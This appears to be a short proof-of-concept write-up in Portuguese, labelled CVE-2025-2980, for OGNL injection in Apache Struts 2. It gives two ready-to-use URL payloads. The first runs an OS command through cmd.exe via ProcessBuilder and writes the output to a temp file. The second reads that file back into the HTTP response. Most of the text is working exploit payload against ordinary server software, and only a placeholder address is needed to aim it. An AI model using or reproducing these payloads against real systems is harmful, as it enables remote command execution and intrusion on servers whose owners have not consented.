@@ -1,0 +1,16 @@
+CVE-2025-2980
+
+Essa PoC visa demonstrar como que é possível explorar um OGNL Injection em sistemas que utilizam Apache Struts 2. No sistema que eu realizei os testes, a resposta da execução de comandos não estava sendo mostrada diretamente na resposta da requisição. Sendo assim, presumi que poderia ser um Blind OS Command Injection e joguei a saída do comando para um arquivo na pasta temporária do sistema operacional. 
+
+Windows: C:\Windows\Temp
+Linux: /tmp
+
+Dessa forma foi possível realizar os comandos e visualizar a saída dos comandos no arquivo que foi jogado na pasta temporária. Na PoC eu jogo a saída dos comandos no arquivo "output.txt". 
+
+Payload para  Blind OS Command Injection: 
+
+https://<ENDERECO_IP>:<PORTA>/?redirect%3a%24%7b%23cmd%3d'whoami%20%3e%20C%3a%5c%5cWindows%5c%5cTemp%5c%5coutput.txt'%2c%23proc%3dnew%20java.lang.ProcessBuilder(new%20java.lang.String%5b%5d%7b'cmd.exe'%2c'%2fc'%2c%23cmd%7d).start()%2c%23proc.waitFor()%7d
+
+Payload para visualizar o arquivo "output.txt":
+
+https://<ENDERECO_IP>:<PORTA>/?redirect:${%23req%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27),%23file%3dnew+java.io.File(%27C:/Windows/Temp/output.txt%27),%23scanner%3dnew+java.util.Scanner(%23file),%23data%3d%23scanner.useDelimiter(%27\\A%27).next(),%23resp%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27).getWriter(),%23resp.println(%23data),%23resp.flush(),%23resp.close()}
